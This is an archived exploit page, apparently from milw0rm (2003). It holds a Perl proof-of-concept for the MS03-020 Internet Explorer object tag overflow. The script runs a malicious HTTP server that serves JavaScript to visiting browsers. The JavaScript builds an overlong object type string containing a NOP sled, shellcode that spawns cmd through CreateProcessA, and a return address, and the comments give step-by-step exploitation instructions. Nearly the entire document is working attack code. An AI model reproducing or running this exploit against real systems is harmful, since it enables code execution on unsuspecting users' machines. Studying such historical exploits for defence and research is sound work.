<html><head><title>MS Internet Explorer Object Tag Exploit (MS03-020)
</title></head><pre>#!/usr/bin/perl

#
#  Proof of concept exploit on IE 5.x - 6.x by Alumni
#  IE-Object longtype dynamic call oferflow
#
#  url://&lt;$shellcode&gt;&lt;'/'x48&gt;&lt;jmp %ptr_sh&gt;
#  the flaw actually exists in URLMON.DLL when converting backslashes
#  to wide char, this can be seen on stack dump near '&amp;CLSID=AAA...2F__2F__...'.
#	
#  To exploit:  i)  start server perl script;
#	     ii) connect to http-service using IE/5.x.
#                   a) the shellcode size is limited up to 56 bytes;
#	     b) the '$ret' may differ as well as the image base of KERNEL32.DLL;
#	     c) to avoid multiple encoding the shellcode is given 'as is' with help of JScript.
#

use IO::Socket;

$port = 80;
$server = IO::Socket::INET-&gt;new (LocalPort =&gt; $port,
				Type =&gt;SOCK_STREAM,
				Reuse =&gt; 1,
				Listen =&gt; $port) or die(&quot;Couldnt't create 
server socket\n&quot;);


$shellcode = 	&quot;\x33\xdb&quot;.		# xor ebx, ebx
		&quot;\x8b\xd4&quot;.		# mov edx, esp
		&quot;\x80\xc6\xff&quot;.		# add dh, 0xFF
		&quot;\xc7\x42\xfc\x63\x6d&quot;.	# mov dword ptr[edx-4], 0x01646D63 
(&quot;cmd\x01&quot;)
		&quot;\x64\x01&quot;.		#
		&quot;\x88\x5a\xff&quot;.		# mov byte ptr[edx-1], bl
		&quot;\x8d\x42\xfc&quot;.		# lea eax, [edx-4]
		&quot;\x8b\xf5&quot;.		# mov esi, ebp
		&quot;\x56\x52&quot;.		# push esi; push edx
		&quot;\x53\x53\x53\x53\x53\x53&quot;.	# push ebx
		&quot;\x50\x53&quot;.		# push eax; push ebx
		&quot;\xb8\x41\x77\xf7\xbf&quot;.	# mov eax, 0xBFF77741 ~= 
CreateProcessA
		&quot;\xff\xd0&quot;.		# call eax
		&quot;\xb8\xf8\xd4\xf8\xbf&quot;.	# mov eax, 0xBFF8D4F8 ~= 
ExitProcess
		&quot;\xff\xd0&quot;.		# call eax
		&quot;\xcc&quot;;			# int 3

$nop = &quot;\x90&quot;;
$ret = &quot;\\xAB\\x5D\\x58&quot;;


while ($client = $server-&gt;accept()) {
	while (&lt;$client&gt;) {
		if ($_ =~ /^(\x0D\x0A)/) {

print $client &lt;&lt;END_DATA;
HTTP/1.0 200 Ok\r
Content-Type: text/html\r
\r
&amp;lt;script&amp;gt;\r
	var mins = 56;\r
	var size = 48;\r
	var sploit = &quot;$shellcode&quot;;\r
	var strNop = &quot;$nop&quot;;\r
	var strObj = '&amp;lt;object type=&quot;';\r
	for (i=0;i&lt;mins-sploit.length;i++) strObj += strNop;\r
	strObj += sploit;\r
	for (i=0;i&lt;size;i++) strObj += '/';\r
	strObj += &quot;CCCCCCCCDDDDDDDD&quot;;\r
	strObj += &quot;$ret&quot;;\r
	strObj += '&quot;&gt;Hello&amp;lt;/object&amp;gt;';\r
	alert(strObj);\r
	document.write(strObj);\r
&amp;lt;/script&amp;gt;\r
END_DATA
			close($client);

		}
	}
}

close($server);

# milw0rm.com [2003-06-07]</pre></html>